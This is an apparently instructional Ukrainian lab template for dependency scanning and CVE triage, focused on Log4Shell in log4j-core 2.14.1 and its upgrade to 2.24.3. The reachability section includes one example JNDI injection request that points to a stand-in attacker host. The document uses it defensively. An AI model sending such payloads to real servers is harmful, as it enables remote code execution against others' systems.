# SCA: профіль ризиків і CVE-тріаж

> Інструмент: **OSV-Scanner** (команда: `scripts\sca-audit.cmd`). Альтернативи: OWASP Dependency-Check
> (`mvn org.owasp:dependency-check-maven:check`), `npm audit`/`pip-audit` для інших стеків.
> Аналізований файл: `pom.xml` (Maven). Дерево залежностей: `mvn dependency:tree`.

## 1. Компоненти (з `mvn dependency:tree`)

| Компонент | Зона | Тип |
|---|---|---|
| `org.apache.logging.log4j:log4j-core` | compile | **direct** |
| `org.apache.logging.log4j:log4j-api` | compile | **direct** (також transitive через log4j-core) |
| `org.junit.jupiter:junit-jupiter` (+ api, params, engine) | test | direct / transitive |
| `org.junit.platform:*`, `org.opentest4j:opentest4j`, `org.apiguardian:apiguardian-api` | test | transitive |

## 2. Первинне сканування (стан `lab3-sca-before`: `log4j.version = 2.14.1`)

Заповніть за власним звітом `reports\osv-report.json` / консольним виводом:

| Critical | High | Medium | Low | Усього компонентів |
|---|---|---|---|---|
| ___ | ___ | ___ | ___ | ___ |

## 3. Детальний тріаж: CVE-2021-44228 («Log4Shell»)

| Поле | Значення |
|---|---|
| Advisory | CVE-2021-44228 / GHSA-jfh8-c2jp-5v3q |
| Компонент і версія | `org.apache.logging.log4j:log4j-core` **2.14.1** |
| Тип залежності | **direct** (оголошена в `pom.xml`) |
| Severity | **Critical**, CVSS v3 = 10.0 |
| Суть | Підстановка (lookup) `${jndi:...}` у даних, що логуються → завантаження віддаленого об'єкта → **віддалене виконання коду (RCE)** |
| Виправлена версія | 2.15.0 (для гілок 2.12.x — 2.12.2, 2.3.x — 2.3.1); повний набір виправлень пов'язаних CVE — **2.17.1+** |
| Пов'язані CVE у 2.14.1 | CVE-2021-45046 (виправлено в 2.16.0), CVE-2021-45105 (DoS, 2.17.0), CVE-2021-44832 (2.17.1) |

### Досяжність (reachability) у нашому коді
`ResilientPricingClient` логує рядок із `itemId`, який береться з URL запиту:

```java
log.warn("Attempt " + attempts + "/" + ... + " failed for " + itemId + ": " + lastError);
```

Запит `GET /api/order/${jndi:ldap://attacker.example/x}` робить цей рядок контрольованим зловмисником.
Лог-запис формується при будь-якому збої залежності (retry/fallback), тому вразливість **досяжна**.
Пом'якшення на рівні JDK (`com.sun.jndi.ldap.object.trustURLCodebase=false` за замовчуванням) знижує,
але не усуває ризик — достатніх компенсувальних заходів немає.

### Рішення: **оновити залежність**
`log4j.version`: `2.14.1` → `2.24.3` (коміт `fix(security): upgrade log4j`). API, який використовує проєкт
(`LogManager.getLogger`, `info/warn/error`), не змінився, тому код не редагується.

### Повторне сканування (стан `lab3-sca-after`)
Очікувано: Critical/High відсутні. Якщо сканер показує нові (пізніші) advisory для обраної версії —
або підніміть версію до найновішої 2.x, або оформіть **прийняття ризику** за шаблоном нижче.

## 4. Шаблон документованого прийняття ризику (лише за потреби)

| Поле | Значення |
|---|---|
| Advisory / компонент | _ID_ / _група:артефакт:версія_ |
| Чому не оновлюємо | _технічна причина (немає виправленої версії, ламаюча зміна тощо)_ |
| Досяжність | _чи викликається вразливий код; приклад: SocketAppender не використовується_ |
| Компенсувальний контроль | _конфігурація, WAF/валідація вводу, мережева ізоляція_ |
| Власник і строк | _хто відповідає; перегляд не пізніше ніж через 90 днів_ |

Ігнорування без такого обґрунтування не допускається.

## 5. Відтворюваність

```
scripts\sca-audit.cmd        (Windows)        sh scripts/sca-audit.sh   (Linux/macOS)
```
Скрипт повертає ненульовий код, якщо знайдено вразливості, тому його можна вставити в CI як крок збірки.
